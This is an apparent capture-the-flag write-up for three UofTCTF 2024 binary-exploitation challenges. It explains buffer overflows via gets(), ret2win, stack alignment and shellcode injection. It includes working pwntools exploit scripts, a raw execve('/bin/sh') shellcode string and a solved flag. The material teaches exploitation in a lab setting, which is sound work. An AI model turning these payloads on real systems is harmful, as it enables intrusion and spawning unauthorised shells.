UofTCTF 2024
=

table of content

- [Basic Overflow (pwn)](#Basic-Overflow-(pwn))
- [Baby_shellcode (pwn)](#Baby_shellcode-(pwn))
- [Patched Shell (pwn)](#Patched-Shell-(pwn))

## Basic Overflow (pwn)

>[!Note]
Ret2Win

![image](https://hackmd.io/_uploads/rkA4xT4jC.png)

![image](https://hackmd.io/_uploads/ByVrg6Ei0.png)

In this challenge, we given a binary file named **basic-overflow**. Based on the description, this is a simple challenge and there is a **gets** function and the author want us to find out about the **gets** function.


![image](https://hackmd.io/_uploads/HySIlpEsR.png)

**gets()** function will get a string from standard input. This function will read a line until either terminating by newline or EOF (null byte '\0'). This function don't have check for buffer overrun and user has been warned to **never use this function**.

![image](https://hackmd.io/_uploads/Hk8weTNjR.png)


In here, I check the exec file type version with cmd `file`. It says:

* ELF 64-bit => work on linux and run on 64 bit
* not stripped => the function name will remain visible

Next I check for another file exec properties that hold the security features with cmd `checksec`

Lets say there's nothing attractive that could hold our progress on GDB. On `NX` it said `NX enabled` mean that we cannot use shellcode technique. &#x20;

* For Explanation on `RELRO` : [https://ir0nstone.gitbook.io/notes/types/stack/relro](https://ir0nstone.gitbook.io/notes/types/stack/relro)

![image](https://hackmd.io/_uploads/r1N_xpViC.png)

I tried to run the file and experiment it limits until it says `segmentation fault` which is there's limitation somewhere.&#x20;



### Check!

<details>

<summary><span data-gb-custom-inline data-tag="emoji" data-code="2139">‚ÑπÔ∏è</span>  Things I need to do to finish the challenge is:</summary>

* [ ] Knowing any functions and write the name and the address somewhere
* [ ] Do disassemble of the function we wrote (to get better of knowing what will the program do, use tool IDA/Ghidra to disassemble and get the pseudocode of the program) and understand what the program will do
* [ ] Research about the function that associate along the way (just the important thing)
* [ ] Calculate the space of stack from args on how much it takes for the buffer to temporarily place it string (Dont forget to add +4 for 32 bit or +8 for 64 bit)
* [ ] Determine what type of exploit technique we can use
* [ ] Try experiment with supposed value and the payload to exploit

</details>



Lets jump to the GDB/debugger

![image](https://hackmd.io/_uploads/ryMoeTVi0.png)


In here, there are two functions that catch my eyes. With just this two functions, I can determine that this program can be exploited with **ret2win** exploit **because** on the second function (**shell** function) it spawn a shell (/bin/sh) from **execve()** function.

>[!Tip]
You may take a look into the function and it method/function carries and find out about it behavior and bugs


1. **main** function

![image](https://hackmd.io/_uploads/Syh6lTEiR.png)

We can look on addr `0x40115e` there is `rbp-0x40` which mean the temporary stack will filled with spaces as much as `0x40` in decimal is **64** bytes to carry out the buffers. Buffer overflow will occurs if we filled the space over that it could takes.

Next is to determine the offset of the program. It may be vary, but on this program, we could take the **64** bytes add **8** bytes (64-bit takes 8 bytes spaces). So, in total **64 + 8 = 72 bytes** of random chars to make the program begin buffer overflow. After the random bytes filled the space, we could take the next spaces (the leaked part) with our intention address, which is the **shell** function address.

2. **shell** function&#x20;

![image](https://hackmd.io/_uploads/Hk50gT4s0.png)

We could note the **shell** addr, which is `0x401136` . This  address will be used as the main part of our payload so the program will return the address of the **shell** function instead of return **0**.


### Try On GDB

Here is the final payload I made for testing on the gdb

```python
python -c "print 'A' * 72 + b'\x36\x11\x40\x00\x00\x00\x00\x00'" > payload.txt

```

* I made a random char with `A` as much as 72 bytes to filled the buffers stack.&#x20;
* Add the next bytes with the return address of **shell** function so the overflow will return this address.
* Convert the address to **Little Endian**

![image](https://hackmd.io/_uploads/HkPxW6VoC.png)
Check the properties of the file

![image](https://hackmd.io/_uploads/BkJXZaNsR.png)

make a breakpoint on main function and run the payload



![image](https://hackmd.io/_uploads/SkCEbTEiC.png)
<p>Just go with <code>ni</code> until <code>ret</code> and watch how the RSP will handle the return addr of <code>shell</code> instead of <code>0</code></p>


![image](https://hackmd.io/_uploads/ryWDbT4iR.png)

<p>Now we on <strong>shell</strong> function, just go <code>ni</code> to end the program and get the shell!</p>



### Exploit



Switch the comments to change from local to remote and vice versa

```python
from pwn import *

context(arch='i386', os='linux')

# Set up the connection to the local binary
binary_path = './basic-overflow'  # Replace with the actual path to your binary
io = process(binary_path)

# Set up the connection to the remote service
# host = '34.123.15.202'
# port = 5000  # Replace with the actual port of the remote service
# io = remote(host, port)

# offset
offset = 72

# retaddr
ret_addr = 0x0000000000401136

# Receive data from the remote service
# data = io.recvline().strip()
# print(f"Received: {data}")

payload = b'A' * offset
payload += p64(ret_addr)

io.sendline(payload)

io.interactive()

```


![image](https://hackmd.io/_uploads/rJp7zTNjA.png)
:::success
**uoftctf{reading_manuals_is_very_fun}**
:::

***

## Baby_shellcode (pwn)


![image](https://hackmd.io/_uploads/B1h8z6Ni0.png)



The author intention is to let us make a shellcode to work on the given file.&#x20;

![image](https://hackmd.io/_uploads/r1hwMpVoR.png)

![image](https://hackmd.io/_uploads/ByOuGTEiA.png)

I checked for the security setting from the file and we can see the properties **NX's** value is **disabled**. **NX** mean for **Non Executable,** which is if this set to **disabled**, we can run an executable inside the program.

![image](https://hackmd.io/_uploads/H1el76VjC.png)

Before we run the program, let's see the available function. In this program, there's no **main** function and only from the **\_start** program that we can look into. So let's make a breakpoint on that function.

![image](https://hackmd.io/_uploads/SJw-7TVoC.png)

Here the full registers, code, and stack. As we can see on the **code**, first it will assign a value as much as **0x400** or **1024 bytes** to a variable.

![image](https://hackmd.io/_uploads/BJcGQ6Eo0.png)


Lets see another code from the program by run next each instruction with  `ni`  Next, the program will call `syscall` with an argument following start from the `mov rsi, rsp`  to `mov eax, 0x0`   which mean with `syscall` , the program will take input from the user as much as **0x400** or **1024 bytes.** After that, the program will take a **jmp** to the address of **rsp** value.

![image](https://hackmd.io/_uploads/Syv7mpEiA.png)

with this pseudocode, we can also determine what the program behavior and the function available also make it easier for us to read and understand the logic of the program.

### Check!

I already gather the information available. Next step is to:

<details>

<summary><span data-gb-custom-inline data-tag="emoji" data-code="1f50e">üîé</span> Things to do!</summary>

* [ ] determine from the program what does the program will do
* [ ] Why there are no return? explore it
* [ ] Is it possible to do BoF? try it
* [ ] It said `shellcode`, search what it is and how it happened
* [ ] Search for list available/cheat sheet for shellcode

</details>



### Try on GDB

![image](https://hackmd.io/_uploads/rJWkETVsA.png)

The behavior I noticed is after calling `systemcall`, the program will take an input from user then do `jmp rsp` which is make the program will jump to specified address by register `rsp` . `rsp` can be filled with anything from string to a specified addresses. If we put it with some string, it will end up with string value and ended it with a null. So, to overwrite it with an address, we should input it with a byte string.

![image](https://hackmd.io/_uploads/rkUF4TEjA.png)

We can try manipulate what we input and lead into creating a shellcode that will spawn a shell to `/bin/sh`.


### Exploit

I did some research  by searching varies write up, basic shellcode, and payload that will work with the challenge and I did found something useful with this source:

[https://shell-storm.org/shellcode/files/shellcode-806.html](https://shell-storm.org/shellcode/files/shellcode-806.html)



basically, with shell code we created a code that machine can understand (ASM) and run the code on the chall program. Instead of run into next instruction as it intended, the program will escape from it and run our code that we created before.

>[!Tip]
I think it is essential to learn a bit for ASM language to understand things work, so we can also create our shellcode if none of things working




#### code

```python
from pwn import *

context(arch='i386', os='linux')

binary_path = './baby-shellcode'
io = process(binary_path)

shcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = shcode

io.sendline(payload)

io.interactive()

```



#### exploited

![image](https://hackmd.io/_uploads/rJwJBT4i0.png)

***



## Patched Shell (pwn)
![image](https://hackmd.io/_uploads/SyWKBaVsA.png)

In this challenge, author gave binary file which is similar to the [Basic-Overflow challenge ](binary-exploitation.md#basic-overflow)before, but there is something different in here that the author managed to change calling `/bin/sh` from **execve()** to **system()**

#### Pseudocode

- main() function
![image](https://hackmd.io/_uploads/HJIcS6VjA.png)

- shell() function

![image](https://hackmd.io/_uploads/HJ3bLa4s0.png)

We can take a look into line 3 where the variable **v4** will take buffer as much as **64** byte. Then, it will take user input with **gets()** function and return 0.&#x20;



### Check!

Info gathered

* [ ] offset is 72 byte (64 byte + 8 byte \[x64 arch])
* [ ] use **gets()** and **system()**

So, what next?

<details>

<summary><span data-gb-custom-inline data-tag="emoji" data-code="1f413">üêì</span>Things to do!</summary>

* [ ] Try out the exploit from [one of the challenge before](binary-exploitation.md#basic-overflow) and watch the behavior on the GDB
* [ ] Search the manual for function **system()**&#x20;
* [ ] Search the similar behavior on the internet and implement the solution

</details>



### Try on GDB


![image](https://hackmd.io/_uploads/HyVU8T4iC.png)

As we could see that with the payload as before is also working at this stage. Look at the RSP which it lead to the **shell** function and the stack is right there.

![image](https://hackmd.io/_uploads/HJ71v6ViC.png)

It jumped to the shell function, just go `ni` until it called the **system()**.

![image](https://hackmd.io/_uploads/rJjkPp4o0.png)

After it reach the **system()** it will called the `/bin/sh`, but it lead to this error with the `XMMWORD PTR` so called. With this error `SIGSEGV` it lead to segmentation vault. After I search about this `XMMWORD PTR` , turn out this problem called as  `stack alignment` which the `RSP` must be 16 byte aligned when a function is called.



### Exploit

There is two technique which we can use based on research:

url: https://github.com/guyinatuxedo/nightmare/issues/44

### 1. Set win address to after `RSP` and `RBP` have been modified

![image](https://hackmd.io/_uploads/BkeMPa4s0.png)

Instead of jump to the first shell function called (`0x401136`), I jump the win address to `0x40113A` after RBP and RSP are set. Which is the one that start with `lea`.&#x20;

#### dbg before this:
- before method
![image](https://hackmd.io/_uploads/r1aMPa4oC.png)

- after method
![image](https://hackmd.io/_uploads/H1G4vT4iR.png)

Notice the different `RSP` on both images. One is filled with the same `RBP` as before, the second one is filled with the base call stack. The second one is worked because it will ignore the initial value of `RBP` that being pushed to the **shell** stack.

![image](https://hackmd.io/_uploads/HyDjD6EsC.png)

this mean it worked on the gdb

#### Payload

```python
from pwn import *

context(arch='i386', os='linux')

# Set up the connection to the local binary
binary_path = './patched-shell'  # Replace with the actual path to your binary
io = process(binary_path)

# Set up the connection to the remote service
# host = '34.123.15.202'
# port = 5000  # Replace with the actual port of the remote service
# io = remote(host, port)

# offset
offset = 72

# sec win addr
win_addr = 0x000000000040113a

# win addr on lea 
payload = b'A' * offset
payload += p64(win_addr)

io.sendline(payload)

io.interactive()

```

![image](https://hackmd.io/_uploads/H1Al_TEjC.png)
:::success
exploited
:::


### 2. Add additional return address of main function before win address


- on main() function
![image](https://hackmd.io/_uploads/BJG7_p4s0.png)


Another method is just to add ret address before the win address.

```
Payload = Padding + Ret_addr + Win_addr
```

#### dbg before this:
- before the function
![image](https://hackmd.io/_uploads/S1BU_aEiA.png)

- after the function
![image](https://hackmd.io/_uploads/rkxw_TEoC.png)


On the stack frame, it will have additional stack from the main function that will call **return,** from the shell function,  and **endbr64** as some mitigation to certain attack. Just do `ni` again to jump to the **shell** function.

![image](https://hackmd.io/_uploads/Sk82OpEsA.png)

Now we have the function, just try `ni` until the **system()** and try to run it


![image](https://hackmd.io/_uploads/ryhnupEjC.png)




#### payload

```python
from pwn import *

context(arch='i386', os='linux')

# Set up the connection to the local binary
binary_path = './patched-shell'  # Replace with the actual path to your binary
io = process(binary_path)

# Set up the connection to the remote service
# host = '34.123.15.202'
# port = 5000  # Replace with the actual port of the remote service
# io = remote(host, port)

# offset
offset = 72

# winaddr
win_addr = 0x0000000000401136

# retaddr
ret_addr = 0x000000000040116b

payload = b'A' * offset
payload += p64(ret_addr)
payload += p64(win_addr)

io.sendline(payload)

io.interactive()

```

![image](https://hackmd.io/_uploads/rk70OTNsA.png)
:::success
exploited
:::

>[!Important]
If met **system()** and it is a BoF, try above method


***



